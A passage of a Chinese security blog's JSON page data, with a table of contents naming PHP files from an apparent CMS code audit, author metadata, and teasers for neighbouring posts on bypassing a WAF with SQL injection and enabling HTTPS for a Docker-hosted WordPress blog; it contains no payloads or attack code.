class=\"toc-text\">admin&#x2F;cms_user.php</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#admin-cms-detail-php\"><span class=\"toc-text\">admin&#x2F;cms_detail.php</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#admin-cms-kamilist-php-1\"><span class=\"toc-text\">admin&#x2F;cms_kamilist.php</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#ucenter-index-php\"><span class=\"toc-text\">ucenter&#x2F;index.php</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#ucenter-cms-user-add-php\"><span class=\"toc-text\">ucenter&#x2F;cms_user_add.php</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#ucenter-repass-php\"><span class=\"toc-text\">ucenter&#x2F;repass.php</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%80%BB%E7%BB%93\"><span class=\"toc-text\">总结</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE\"><span class=\"toc-text\">参考文献</span></a></li></ol>","author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"从SQL注入绕过最新安全狗WAF中学习fuzz","uid":"c4af92d3966b8512b6eb5994e52b620f","slug":"从SQL注入绕过最新安全狗WAF中学习fuzz","date":"2022-06-08T09:35:30.000Z","updated":"2024-02-14T07:42:42.000Z","comments":true,"path":"api/articles/从SQL注入绕过最新安全狗WAF中学习fuzz.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141515509.png","text":"声明文章首发于先知社区https://xz.aliyun.com/t/11412 前言SQL注入并不是很精通，通过实战绕过WAF来进行加强SQL注入能力，希望对正在学习的师傅能有一丝帮助。 安装安装前言我是本地搭建的环境进行测试的环境是windows11+phpstudy2018...","link":"","photos":[],"count_time":{"symbolsCount":"7.3k","symbolsTime":"7 mins."},"categories":[{"name":"绕WAF","slug":"绕WAF","count":1,"path":"api/categories/绕WAF.json"}],"tags":[{"name":"SQL注入","slug":"SQL注入","count":2,"path":"api/tags/SQL注入.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"docker搭建的wordpress博客http转换https","uid":"d6ca6f4d3d89a2aaf340b7664d7ca172","slug":"docker搭建的博客HTTP转HTTPS","date":"2022-05-18T03:56:30.000Z","updated":"2023-03-14T07:27:18.000Z","comments":true,"path":"api/articles/docker搭建的博客HTTP转HTTPS.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141527785.png","text":"前言由于http显示的不安全让我感觉很不好，所以百度了一下，添加了SSL证书，而后成功转换成了https，过程记录如下，希望对师傅们有所帮助。 端口第一个我们需要注意的事情就是我们是否开启了443端口，我们的服务器是否开了端口 而后呢，我们需要查看我们的wordpress是否开启...","link":"","photos":[],"count_time":{"symbolsCount":"2.9k","symbolsTime":"3 mins."},"categories":[{"name":"博客","slug":"博客","count":2,"path":"api/categories/博客.json"}],"tags":[{"name":"博客搭建","slug":"博客搭建","count":2,"path":"api/tags/博客搭建.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":false}}